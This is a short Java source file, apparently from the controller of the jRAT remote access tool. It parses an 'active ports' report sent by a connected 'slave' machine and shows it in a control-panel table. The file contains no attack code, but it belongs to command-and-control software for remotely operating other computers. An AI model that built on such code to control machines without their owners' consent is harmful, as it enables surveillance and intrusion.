package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlActivePorts;

import java.io.DataInputStream;


public class Packet51ActivePort extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String prot = slave.readLine();
		String la = slave.readLine();
		String status = slave.readLine();
		String ext = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlActivePorts panel = (PanelControlActivePorts) frame.panels.get("active ports");
			panel.getModel().addRow(new Object[] { prot, la, ext, status });
		}

	}

}
